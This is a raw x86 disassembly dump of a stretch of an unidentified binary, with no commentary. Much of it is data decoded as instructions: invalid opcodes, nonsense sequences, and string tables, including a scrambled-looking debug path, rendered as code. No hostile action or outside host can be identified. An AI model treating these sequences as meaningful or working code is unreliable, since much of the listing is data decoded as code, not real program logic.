  433309:	div    ah
  43330b:	inc    DWORD PTR [ebp+0x45]
  43330e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433314:	jb     0x4332a1
  433316:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x10]
  433320:	xor    ecx,DWORD PTR [ebp+0x3]
  433323:	mov    edi,DWORD PTR [ebx]
  433325:	adc    BYTE PTR [ebp+0x41],dh
  433328:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43332e:	ret    
  43332f:	push   ss
  433330:	push   0x45
  433332:	lea    ecx,[ebx+0x4de80cb0]
  433338:	sti    
  433339:	add    edi,edi
  43333b:	or     BYTE PTR [ebp+0x4d],al
  43333e:	mov    ebp,DWORD PTR [ebx]
  433340:	xor    ebp,ecx
  433342:	mov    al,BYTE PTR [edx]
  433344:	add    eax,0xc7200
  433349:	jne    0x433398
  43334b:	lea    esi,[ebx]
  43334d:	mov    al,0xf
  43334f:	call   0xf2a14
  433354:	shl    DWORD PTR [ecx],0x84
  433357:	pushf  
  433358:	add    DWORD PTR [ecx+0x4545d000],ecx
  43335e:	mov    esi,DWORD PTR [edx]
  433360:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433367:	test   DWORD PTR [eax],eax
  433369:	clc    
  43336a:	dec    ebp
  43336b:	inc    ebp
  43336c:	xor    edi,DWORD PTR [edi+ecx*1]
  43336f:	pushf  
  433370:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433377:	lea    eax,[ecx]
  433379:	int3   
  43337a:	add    BYTE PTR [ebp+0x45],cl
  43337d:	lea    ecx,[ebx-0x75b2cc38]
  433383:	lea    eax,ds:0x4d72c4
  433389:	mov    ecx,DWORD PTR [ebp-0x4]
  43338c:	xor    ecx,edi
  43338e:	bswap  ebx
  433390:	ror    BYTE PTR [ebp-0x35],0xe9
  433394:	rol    DWORD PTR [ecx],0x84
  433397:	add    BYTE PTR [ecx],al
  433399:	xor    eax,DWORD PTR [eax]
  43339b:	pushf  
  43339c:	inc    ebp
  43339d:	jnp    0x8a4367a0
  4333a3:	mov    eax,DWORD PTR ds:0xcf72e8
  4333a9:	lock dec ebp
  4333ab:	retf   
  4333ac:	xor    ecx,DWORD PTR [ebp+0xf]
  4333af:	mov    eax,eax
  4333b1:	fmul   st,st(3)
  4333b3:	test   ecx,0x19b8484
  4333b9:	xor    al,BYTE PTR [eax]
  4333bb:	mov    DWORD PTR [ebp-0x28],eax
  4333be:	mov    eax,DWORD PTR [ebp+0x33]
  4333c1:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4333c7:	ret    
  4333c8:	add    al,cl
  4333ca:	dec    ebp
  4333cb:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4333d1:	add    ecx,DWORD PTR ds:0xc7250
  4333d7:	inc    ebp
  4333d8:	rcl    DWORD PTR [eax+0x4d],0x2b
  4333dc:	mov    edi,edi
  4333de:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4333e4:	jb     0x4333ad
  4333e6:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4333ed:	mov    esi,DWORD PTR [ebx]
  4333ef:	cld    
  4333f0:	mov    cl,bh
  4333f2:	or     eax,0x372b6
  4333f7:	cmp    ecx,eax
  4333f9:	jne    0x433476
  4333ff:	mov    eax,DWORD PTR [ebp-0x20]
  433402:	mov    eax,DWORD PTR [eax]
  433404:	xor    eax,edi
  433406:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43340d:	mov    ecx,DWORD PTR [ebp-0x4]
  433410:	mov    ecx,edi
  433412:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433418:	jb     0x433429
  43341a:	add    BYTE PTR [edi-0x3f],dl
  43341d:	add    BYTE PTR [ebp-0x75],cl
  433420:	mov    esi,eax
  433422:	xor    eax,DWORD PTR [eax]
  433424:	mov    al,bh
  433426:	or     eax,0x4b7284
  43342b:	xor    al,cl
  43342d:	mov    ecx,DWORD PTR [ebp-0x4]
  433430:	mov    ecx,edi
  433432:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433438:	jb     0x433449
  43343a:	add    BYTE PTR [edi],dh
  43343c:	enter  0x8500,0x8b
  433440:	add    ah,bl
  433442:	add    BYTE PTR [eax],al
  433444:	inc    ebp
  433445:	(bad)  
  433446:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  43344d:	mov    esi,DWORD PTR [edx-0x4]
  433450:	add    bh,cl
  433452:	dec    ebp
  433453:	mov    dh,0x8b
  433455:	add    esi,DWORD PTR [ebx]
  433457:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43345d:	add    BYTE PTR [eax],al
  43345f:	mov    eax,ecx
  433461:	loopne 0x4334b0
  433463:	add    BYTE PTR [ebx-0x757bcc39],cl
  433469:	dec    ebx
  43346a:	or     eax,0x8b7232
  43346f:	in     al,0xc1
  433471:	or     DWORD PTR [ebp-0x31],ecx
  433474:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  43347b:	xor    dh,BYTE PTR [edx-0x75]
  43347e:	add    al,dh
  433480:	enter  0x4f09,0xcf
  433484:	inc    ebp
  433485:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43348b:	or     al,BYTE PTR ds:0xe4728b
  433491:	or     DWORD PTR [ebp-0x31],ecx
  433494:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43349b:	cmp    dh,BYTE PTR [edx+0xf]
  43349e:	add    bl,dl
  4334a0:	rol    DWORD PTR [eax],0x4d
  4334a3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4334a9:	(bad)  
  4334aa:	or     eax,0x4b7284
  4334af:	xor    al,cl
  4334b1:	mov    ecx,DWORD PTR [ebp-0x20]
  4334b4:	mov    ecx,DWORD PTR [ecx]
  4334b6:	xor    ecx,edi
  4334b8:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4334bf:	xor    cl,al
  4334c1:	mov    ecx,DWORD PTR [edi]
  4334c3:	fadd   QWORD PTR [ebp+0x9]
  4334c6:	call   0xffd02f9a
  4334cb:	dec    ebx
  4334cc:	dec    ebp
  4334cd:	xor    bh,BYTE PTR [ebx]
  4334cf:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4334d3:	loopne 0x4334d1
  4334d5:	or     edi,eax
  4334d7:	iret   
  4334d8:	ret    
  4334d9:	mov    WORD PTR [ebp+0x4f],es
  4334dc:	mov    esi,DWORD PTR [edx]
  4334de:	call   0x8452fc1d
  4334e3:	(bad)  
  4334e4:	fwait
  4334e5:	add    BYTE PTR [edx],dh
  4334e7:	mov    esi,DWORD PTR [ebx]
  4334e9:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4334ef:	test   BYTE PTR [ebx],dh
  4334f1:	dec    ebx
  4334f2:	add    esi,DWORD PTR [edx]
  4334f4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4334fa:	dec    edi
  4334fc:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433503:	xor    al,BYTE PTR [ebx]
  433505:	mov    edi,DWORD PTR [ebx]
  433507:	in     al,0x75
  433509:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43350f:	dec    ebx
  433510:	xor    esi,DWORD PTR [edx]
  433512:	lea    ecx,[edx]
  433514:	or     BYTE PTR [ebx+0x900f072],cl
  43351a:	ja     0x4334eb
  43351c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  433523:	cmp    ch,al
  433525:	jne    0x43351a
  433527:	mov    edi,edi
  433529:	fadd   QWORD PTR [ebp+0x0]
  43352c:	mov    eax,edi
  43352e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433535:	mov    edx,DWORD PTR [ebx]
  433537:	in     al,0x45
  433539:	or     DWORD PTR [ebx],esi
  43353b:	iret   
  43353c:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  433543:	xor    dl,BYTE PTR [eax-0x75]
  433546:	sbb    al,0xe0
  433548:	dec    DWORD PTR [ecx]
  43354a:	mov    ecx,edi
  43354c:	in     al,dx
  43354d:	mov    eax,es
  43354f:	dec    ebx
  433550:	mov    DWORD PTR [edx],esi
  433552:	fmul   QWORD PTR [edx]
  433554:	jne    0x4334e1
  433556:	(bad)  
  433557:	(bad)  
  433559:	or     DWORD PTR [ebp-0x31],eax
  43355c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  433563:	cmp    bh,bh
  433565:	jne    0x4335ac
  433567:	lea    ecx,[ebx-0x38372750]
  43356d:	inc    ebx
  43356f:	mov    eax,ecx
  433571:	mov    eax,0xa00c111
  433576:	jne    0x4335bd
  433578:	mov    esi,DWORD PTR [ebx]
  43357a:	test   al,0x3
  43357c:	inc    ebp
  43357d:	mov    DWORD PTR [eax-0xc],edx
  433580:	loop   0x4335c7
  433582:	push   DWORD PTR [ebx]
  433584:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43358a:	add    DWORD PTR [eax],eax
  43358c:	mov    eax,edi
  43358e:	lods   al,BYTE PTR ds:[esi]
  43358f:	dec    ebp
  433590:	inc    ebp
  433591:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433597:	retf   
  433598:	mov    edx,ecx
  43359a:	adc    al,0x84
  43359c:	(bad)  
  43359d:	std    
  43359e:	ret    
  43359f:	jmp    FWORD PTR [edi-0x2b7474bb]
  4335a5:	hlt    
  4335a6:	rol    edi,0x82
  4335a9:	ret    
  4335aa:	cld    
  4335ab:	enter  0x11ff,0x45
  4335af:	inc    ebp
  4335b0:	pop    edi
  4335b1:	mov    ebx,DWORD PTR [ebx+0x14]
  4335b4:	ret    0xc7
  4335b7:	test   BYTE PTR [ebx+0x4532519b],cl
  4335bd:	jmp    0x43354a
  4335bf:	push   0x8
  4335c1:	call   DWORD PTR [esi]
  4335c3:	in     al,dx
  4335c4:	add    BYTE PTR [ebp+0x1],0x50
  4335c8:	add    bh,ah
  4335ca:	add    bh,bh
  4335cc:	icebp  
  4335cd:	mov    ecx,DWORD PTR [eax]
  4335cf:	cld    
  4335d0:	pop    es
  4335d1:	dec    ebp
  4335d2:	shl    DWORD PTR [ebx],0x72
  4335d5:	add    eax,DWORD PTR [eax]
  4335d7:	cmp    edx,ecx
  4335d9:	je     0x4335eb
  4335db:	mov    esi,DWORD PTR [ebp-0x4]
  4335de:	inc    edi
  4335e0:	or     al,0xc3
  4335e2:	jmp    FWORD PTR [edx-0x18]
  4335e5:	(bad)  
  4335e6:	sti    
  4335e7:	cwde   
  4335e8:	(bad)  
  4335e9:	call   0xffa12ef4
  4335ee:	or     al,0x45
  4335f0:	push   ebp
  4335f1:	sub    esp,0x18
  4335f4:	push   ebx
  4335f5:	inc    ebp
  4335f6:	mov    edi,edi
  4335f8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4335ff:	test   al,0x54
  433601:	inc    ebp
  433602:	push   ecx
  433603:	push   eax
  433604:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43360a:	add    ah,bh
  43360c:	(bad)  
  43360d:	dec    ebp
  43360e:	add    DWORD PTR [ebx],esi
  433610:	inc    ebp
  433611:	add    ecx,DWORD PTR [ebx+0x74943b]
  433617:	push   0xffffff8b
  433619:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43361f:	add    eax,DWORD PTR [ecx]
  433621:	or     BYTE PTR [eax],al
  433623:	call   0xff852e28
  433628:	mov    eax,DWORD PTR [ebp+0x14]
  43362b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  433631:	inc    ebp
  433632:	dec    ecx
  433633:	add    ebp,DWORD PTR [edx+0x14]
  433636:	push   0x8b3045
  43363b:	call   0x33ad83b0
  433640:	inc    DWORD PTR [ebx]
  433642:	mov    DWORD PTR [edi],ecx
  433644:	mov    eax,ecx
  433646:	or     BYTE PTR [ebp-0x3d],cl
  433649:	cmp    eax,edi
  43364b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433650:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433656:	adc    al,0xc9
  433658:	inc    ebp
  433659:	adc    BYTE PTR [eax+0x55],dl
  43365c:	jne    0x43364a
  43365e:	call   0xff5435ee
  433663:	dec    ebp
  433664:	inc    ebp
  433665:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43366b:	add    BYTE PTR [ebx],bh
  43366d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  433671:	push   esp
  433672:	or     al,0x51
  433674:	dec    ebp
  433675:	xor    DWORD PTR [ebx],0xf32039b
  43367b:	cmp    eax,DWORD PTR [ebp+0x74]
  43367e:	mov    edi,edi
  433680:	pop    edi
  433681:	adc    BYTE PTR [ebx+0x75],bl
  433684:	ret    0x50
  433687:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43368b:	(bad)  
  43368c:	clc    
  43368d:	mov    esp,ebp
  43368f:	pop    ecx
  433690:	mov    ecx,0xf80085c2
  433695:	mov    ecx,DWORD PTR [ecx+edx*2]
  433698:	push   esi
  433699:	push   esi
  43369a:	(bad)  
  43369b:	lock add DWORD PTR [ebp+0x44],eax
  43369f:	mov    edx,DWORD PTR [eax]
  4336a1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4336a5:	or     BYTE PTR [edi+eax*1+0x51],dl
  4336a9:	ret    
  4336aa:	xor    ebx,DWORD PTR [ebx+0x37232be]
  4336b0:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4336b6:	or     al,0x80
  4336b8:	jge    0x4336bb
  4336ba:	mov    DWORD PTR [eax],eax
  4336bc:	and    al,0x8
  4336be:	cmp    DWORD PTR [ebp+0x10],eax
  4336c1:	mov    edx,DWORD PTR [esi]
  4336c3:	xchg   esp,eax
  4336c4:	dec    esp
  4336c5:	add    BYTE PTR [eax],dl
  4336c7:	mov    ecx,edx
  4336c9:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4336cd:	dec    ebp
  4336ce:	into   
  4336cf:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4336d5:	mov    edx,DWORD PTR [eax+0x14]
  4336d8:	das    
  4336d9:	add    al,0x45
  4336db:	add    BYTE PTR [ebp+0x0],dh
  4336de:	mov    edi,edi
  4336e0:	and    al,0x50
  4336e2:	mov    eax,DWORD PTR [eax]
  4336e4:	and    al,0xd1
  4336e6:	xor    eax,DWORD PTR [esi]
  4336e8:	lea    eax,[ebp+0x8]
  4336eb:	xor    esi,DWORD PTR [edx+0x3]
  4336ee:	add    BYTE PTR [ecx+0x4510fc44],cl
  4336f4:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4336fa:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433704:	cmp    al,0xff
  433706:	pushf  
  433707:	mov    edi,edi
  433709:	or     BYTE PTR [esi+ecx*1],cl
  43370c:	jne    0x4336d1
  43370e:	call   0xc36da
  433713:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433717:	mov    ebx,DWORD PTR [eax]
  433719:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43371d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433725:	pop    esi
  433726:	and    al,0xc9
  433728:	call   DWORD PTR [eax]
  43372a:	and    al,0x55
  43372c:	call   0x28361d
  433731:	add    DWORD PTR [eax+edx*1+0xc],0x31
  433736:	clc    
  433737:	pushf  
  433738:	dec    DWORD PTR [ecx+0x57892474]
  43373e:	jmp    0x433781
  433740:	and    al,0x89
  433742:	and    al,0x24
  433744:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  43374a:	dec    DWORD PTR [eax]
  43374c:	and    al,0x7
  43374e:	pop    esi
  43374f:	cli    
  433750:	in     eax,0x9b
  433752:	ret    0x32
  433755:	add    eax,edx
  433757:	mov    DWORD PTR [ebx+0x688b8924],ebx
  43375d:	or     al,0xf8
  43375f:	jl     0x4337de
  433761:	adc    al,0x9c
  433763:	dec    ebp
  433764:	push   0xff8b7575
  433769:	and    al,0xff
  43376b:	xor    edi,edi
  43376d:	mov    esi,DWORD PTR [esp-0x75]
  433771:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  433777:	or     bl,ch
  433779:	cmp    DWORD PTR [eax],edx
  43377b:	sbb    al,0x44
  43377d:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433781:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433788:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43378f:	test   eax,0x83001010
  433794:	dec    eax
  433795:	adc    BYTE PTR [eax],al
  433797:	adc    edi,DWORD PTR [edx+0x10]
  43379a:	add    cl,bh
  43379c:	jae    0x4337ae
  43379e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  4337a4:	pop    eax
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	fidiv  DWORD PTR [ebp+0x10]
  4337aa:	add    dh,bl
  4337ac:	movups xmm0,XMMWORD PTR [eax]
  4337af:	popf   
  4337b0:	push   cs
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	ins    DWORD PTR es:[edi],dx
  4337b4:	or     BYTE PTR [eax],dl
  4337b6:	add    BYTE PTR [ebx+eiz*2+0x378f0010],cl
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [ebx-0x58ffbcc9],ah
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [ebx-0x50ffbcc9],ch
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [ebx-0x48ffbcc9],dh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [ebx-0x73ffefdd],bh
  4337ec:	cmp    al,0x10
  4337ee:	add    BYTE PTR [ebx+0x30],cl
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	sub    al,0xc
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	push   ds
  4337f8:	adc    BYTE PTR ds:[eax],al
  4337fb:	mov    bh,0x56
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433803:	cmp    al,0x4f
  433805:	adc    BYTE PTR [eax],al
  433807:	out    0x37,eax
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	fcomp  QWORD PTR [eax+edx*1+0x0]
  43382b:	jle    0x43384d
  43382d:	adc    BYTE PTR [eax],al
  43382f:	cld    
  433830:	dec    edx
  433831:	adc    BYTE PTR [eax],al
  433833:	add    al,0xb
  433835:	adc    BYTE PTR [eax],al
  433837:	push   ebx
  433838:	ins    DWORD PTR es:[edi],dx
  433839:	adc    BYTE PTR [eax],al
  43383b:	fs jl  0x43384e
  43383e:	add    BYTE PTR [edx+0x42001015],ah
  433844:	jge    0x433856
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433868:	cmp    dl,BYTE PTR [eax]
  43386a:	add    BYTE PTR [ebx],ah
  43386c:	aas    
  43386d:	adc    BYTE PTR [eax],al
  43386f:	jne    0x43387c
  433871:	adc    BYTE PTR [eax],al
  433873:	fldenv [esi]
  433875:	adc    BYTE PTR [eax],al
  433877:	xchg   esp,eax
  433878:	push   0x10
  43387a:	add    bl,ah
  43387c:	pop    eax
  43387d:	adc    BYTE PTR [eax],al
  43387f:	in     al,0x2f
  433881:	adc    BYTE PTR [eax],al
  433883:	leave  
  433884:	sbb    DWORD PTR [eax],edx
  433886:	add    BYTE PTR [edi+0x38],ah
  433889:	inc    ebx
  43388a:	add    BYTE PTR [ebx+0x38],ch
  43388d:	inc    ebx
  43388e:	add    BYTE PTR [edi+0x38],ch
  433891:	inc    ebx
  433892:	add    BYTE PTR [ebx+0x38],dh
  433895:	inc    ebx
  433896:	add    BYTE PTR [edi+0x38],dh
  433899:	inc    ebx
  43389a:	add    BYTE PTR [ebx+0x38],bh
  43389d:	inc    ebx
  43389e:	add    BYTE PTR [edi+0x38],bh
  4338a1:	inc    ebx
  4338a2:	add    BYTE PTR [ebx-0x42ffbcc8],al
  4338a8:	bound  edx,QWORD PTR [eax]
  4338aa:	add    BYTE PTR ds:0x57001010,bl
  4338b0:	push   ecx
  4338b1:	adc    BYTE PTR [eax],al
  4338b3:	dec    eax
  4338b4:	ins    DWORD PTR es:[edi],dx
  4338b5:	adc    BYTE PTR [eax],al
  4338b7:	mov    eax,DWORD PTR [edi]
  4338b9:	adc    BYTE PTR [eax],al
  4338bb:	mov    ah,0x7
  4338bd:	adc    BYTE PTR [eax],al
  4338bf:	ror    DWORD PTR [esi],1
  4338c1:	adc    BYTE PTR [eax],al
  4338c3:	pop    edi
  4338c4:	inc    ebp
  4338c5:	adc    BYTE PTR [eax],al
  4338c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4338c8:	cmp    BYTE PTR [ebx+0x0],al
  4338cb:	stos   DWORD PTR es:[edi],eax
  4338cc:	cmp    BYTE PTR [ebx+0x0],al
  4338cf:	scas   eax,DWORD PTR es:[edi]
  4338d0:	cmp    BYTE PTR [ebx+0x0],al
  4338d3:	mov    bl,0x38
  4338d5:	inc    ebx
  4338d6:	add    BYTE PTR [edi-0x44ffbcc8],dh
  4338dc:	cmp    BYTE PTR [ebx+0x0],al
  4338df:	mov    edi,0xc3004338
  4338e4:	cmp    BYTE PTR [ebx+0x0],al
  4338e7:	dec    ecx
  4338e8:	ss push eax
  4338ea:	pop    edi
  4338eb:	ss inc ebx
  4338ed:	ss pop edx
  4338ef:	xor    ebx,DWORD PTR [edi+0x52]
  4338f2:	add    BYTE PTR [edi+ecx*2+0x32],dl
  4338f6:	pop    edi
  4338f7:	dec    esi
  4338f8:	dec    esp
  4338f9:	dec    eax
  4338fa:	xor    esi,DWORD PTR [edx]
  4338fc:	pop    edi
  4338fd:	xor    al,0x4b
  4338ff:	add    BYTE PTR [eax+0x49],cl
  433902:	push   ebp
  433903:	xor    al,0x5f
  433905:	dec    esp
  433906:	inc    edx
  433907:	dec    ecx
  433908:	cmp    DWORD PTR [edi+ebx*2],esi
  43390b:	pop    ecx
  43390c:	inc    edi
  43390d:	add    BYTE PTR [eax+0x50],bl
  433910:	dec    eax
  433911:	pop    edi
  433912:	push   ebp
  433913:	push   ecx
  433914:	inc    edi
  433915:	xor    cl,BYTE PTR [edx+0x38]
  433918:	push   esi
  433919:	add    BYTE PTR [ebx+0x4a],al
  43391c:	push   edx
  43391d:	pop    edi
  43391e:	dec    edi
  43391f:	dec    eax
  433920:	dec    edi
  433921:	dec    edi
  433922:	dec    edx
  433923:	add    BYTE PTR [ecx+0x52],al
  433926:	cmp    DWORD PTR [edi+0x56],ebx
  433929:	aaa    
  43392a:	dec    esp
  43392b:	cmp    DWORD PTR [ebx+0x5f],eax
  43392e:	push   edx
  43392f:	inc    esp
  433930:	add    BYTE PTR [ecx+0x37],bl
  433933:	inc    esp
  433934:	pop    edi
  433935:	dec    ecx
  433936:	xor    esi,DWORD PTR [edi]
  433938:	xor    DWORD PTR [edi+0x49],ebx
  43393b:	push   esp
  43393c:	xor    eax,DWORD PTR [eax]
  43393e:	push   edx
  43393f:	xor    BYTE PTR [eax+0x5f],bl
  433942:	dec    eax
  433943:	push   edi
  433944:	inc    esi
  433945:	xor    DWORD PTR [edi+0x5f],edx
  433948:	cmp    BYTE PTR [ebx+0x37],dl
  43394b:	add    BYTE PTR [esi+0x42],dl
  43394e:	dec    ecx
  43394f:	xor    ebx,DWORD PTR [edi+0x45]
  433952:	xor    BYTE PTR [ebp+0x5f],cl
  433955:	xor    al,0x34
  433957:	xor    BYTE PTR [edx+0x5f],cl
  43395a:	inc    edi
  43395b:	add    BYTE PTR [edx+0x57],dl
  43395e:	xor    ebx,DWORD PTR [edi+0x31]
  433961:	dec    edx
  433962:	push   edi
  433963:	xor    eax,0x4d435f
  433968:	dec    ecx
  433969:	xor    eax,0x36365f39
  43396e:	dec    eax
  43396f:	xor    BYTE PTR [eax],al
  433971:	dec    edi
  433972:	inc    ebx
  433973:	push   edi
  433974:	pop    edi
  433975:	inc    edi
  433976:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  43397b:	add    BYTE PTR [edx+0x0],al
  43397e:	pop    eax
  43397f:	add    BYTE PTR [edi+0x0],al
  433982:	add    BYTE PTR ss:[edi+0x0],bl
  433986:	push   esi
  433987:	add    BYTE PTR [ebx+0x0],al
  43398a:	dec    esi
  43398b:	add    BYTE PTR [eax+eax*1+0x0],al
  43398f:	add    BYTE PTR [edi+0x0],cl
  433992:	dec    ebp
  433993:	add    BYTE PTR [edi+0x0],al
  433996:	xor    eax,DWORD PTR [eax]
  433998:	pop    edi
  433999:	add    BYTE PTR [eax+eax*1],dh
  43399c:	dec    esi
  43399d:	add    BYTE PTR [edx+0x0],bl
  4339a0:	cmp    BYTE PTR [eax],al
  4339a2:	pop    edi
  4339a3:	add    BYTE PTR [eax+0x0],bl
  4339a6:	cmp    BYTE PTR [eax],al
  4339a8:	add    BYTE PTR [eax],al
  4339aa:	push   edx
  4339ab:	add    BYTE PTR [eax+0x0],bl
  4339ae:	push   ecx
  4339af:	add    BYTE PTR [edi+0x0],bl
  4339b2:	dec    esp
  4339b3:	add    BYTE PTR [edx+0x0],dl
  4339b6:	dec    ecx
  4339b7:	add    BYTE PTR [edi+0x0],cl
  4339ba:	inc    esp
  4339bb:	add    BYTE PTR [edi+0x0],bl
  4339be:	dec    edi
  4339bf:	add    BYTE PTR [ebx],dh
  4339c1:	add    BYTE PTR [eax+eax*1+0x0],al
  4339c5:	add    BYTE PTR [ebx+0x0],al
  4339c8:	push   eax
  4339c9:	add    BYTE PTR [ebp+0x0],al
  4339cc:	pop    edi
  4339cd:	add    BYTE PTR ds:0x39004500,dh
  4339d3:	add    BYTE PTR [edi+0x0],bl
  4339d6:	push   esi
  4339d7:	add    BYTE PTR [eax],al
  4339d9:	add    BYTE PTR [edi+0x0],al
  4339dc:	dec    esi
  4339dd:	add    BYTE PTR [esi+0x0],dl
  4339e0:	pop    edi
  4339e1:	add    BYTE PTR [edi+0x0],al
  4339e4:	push   esp
  4339e5:	add    BYTE PTR [eax+0x0],cl
  4339e8:	xor    al,BYTE PTR [eax]
  4339ea:	xor    DWORD PTR [eax],eax
  4339ec:	pop    edi
  4339ed:	add    BYTE PTR [edi+0x0],cl
  4339f0:	add    BYTE PTR ss:[ebx],dh
  4339f3:	add    BYTE PTR [eax],al
  4339f5:	add    BYTE PTR [eax+eax*1+0x45],al
  4339f9:	add    BYTE PTR [ecx+0x0],cl
  4339fc:	pop    edi
  4339fd:	add    BYTE PTR [edx+0x0],dl
  433a00:	dec    eax
  433a01:	add    BYTE PTR [eax+eax*1],dh
  433a04:	dec    eax
  433a05:	add    BYTE PTR [eax],al
  433a07:	add    BYTE PTR [eax],al
  433a09:	push   edx
  433a0a:	push   ebx
  433a0b:	inc    esp
  433a0c:	push   ebx
  433a0d:	enter  0xf03f,0x95
  433a11:	(bad)  
  433a12:	cwde   
  433a13:	push   esi
  433a14:	dec    edx
  433a15:	lods   eax,DWORD PTR ds:[esi]
  433a16:	xchg   BYTE PTR [esi+0x29],bh
  433a19:	mov    ebp,0xe5e98f0
  433a1e:	add    BYTE PTR [eax],al
  433a20:	add    BYTE PTR [ecx+0x3a],dl
  433a23:	pop    esp
  433a24:	js     0x433a7e
  433a26:	ins    DWORD PTR es:[edi],dx
  433a27:	arpl   WORD PTR [esi+0x76],sp
  433a2a:	addr16 jp 0x433aa1
  433a2d:	pop    esp
  433a2e:	inc    ebp
  433a2f:	inc    esi
  433a30:	dec    edx
  433a31:	bound  ebp,QWORD PTR [edx+0x67]
  433a34:	popa   
  433a35:	push   0x6c776a5c
  433a3a:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  433a3e:	popa   
  433a3f:	bound  esi,QWORD PTR [edi+0x65]
  433a42:	cs jo  0x433aa9
  433a45:	bound  eax,QWORD PTR [eax]
	...
